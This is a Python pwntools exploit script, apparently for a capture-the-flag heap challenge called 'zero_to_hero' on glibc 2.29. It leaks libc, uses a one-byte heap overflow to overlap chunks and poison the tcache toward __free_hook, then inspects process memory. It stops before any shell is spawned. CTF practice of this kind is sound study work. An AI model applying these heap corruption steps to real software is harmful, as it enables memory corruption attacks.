from pwn import *

context.binary = ELF("./zero_to_hero", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "debug"

PROMPT = b"> "
ARR = 0x602060
SYSTEM = "system"
FREE_HOOK = "__free_hook"


def start():
    return process(["./ld-2.29.so", "./zero_to_hero"], env={"LD_PRELOAD": "./libc.so.6"})


def init(p):
    p.recvuntil(b"hero?\n")
    p.sendline(b"y")
    p.recvline()
    p.recvline()
    leak_line = p.recvline()
    leak = int(leak_line.split(b": ")[1], 16)
    libc.address = leak - libc.symbols[SYSTEM]
    log.info(f"libc base = {hex(libc.address)}")
    p.recvuntil(PROMPT)


def add(p, length, data):
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(length).encode())
    p.recvuntil(b"description: ")
    if len(data) < length:
        data = data.ljust(length, b"\n")
    p.send(data)
    p.recvuntil(PROMPT)


def add_exact(p, length, data):
    assert len(data) == length
    p.sendline(b"1")
    p.recvuntil(b"description?\n")
    p.sendline(str(length).encode())
    p.recvuntil(b"description: ")
    p.send(data)
    p.recvuntil(PROMPT)


def delete(p, idx):
    p.sendline(b"2")
    p.recvuntil(b"remove?\n")
    p.sendline(str(idx).encode())
    p.recvuntil(PROMPT)

if __name__ == "__main__":
    p = start()
    init(p)

    add(p, 0x108, b"A"*0x108)
    add(p, 0x100, b"B"*0x100)
    add(p, 0x100, b"C"*0x100)

    delete(p, 0)
    add_exact(p, 0x108, b"E"*0x108)
    delete(p, 3)
    delete(p, 1)

    target = libc.symbols[FREE_HOOK]
    payload = b"P"*0x100 + p64(0x210) + p64(0x111) + p64(target)
    payload = payload.ljust(0x200, b"P")
    add_exact(p, 0x200, payload)

    add_exact(p, 0x100, b"R"*0x100)
    add_exact(p, 0x100, b"S"*0x100)

    with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
        mem.seek(ARR)
        arr = [u64(mem.read(8)) for _ in range(7)]
    log.info("Array pointers: " + str([hex(x) for x in arr]))

    hook = libc.symbols[FREE_HOOK]
    with open(f"/proc/{p.pid}/mem", "rb", 0) as mem:
        mem.seek(hook)
        value = u64(mem.read(8))
    log.info(f"__free_hook value: {hex(value)}")

    p.close()
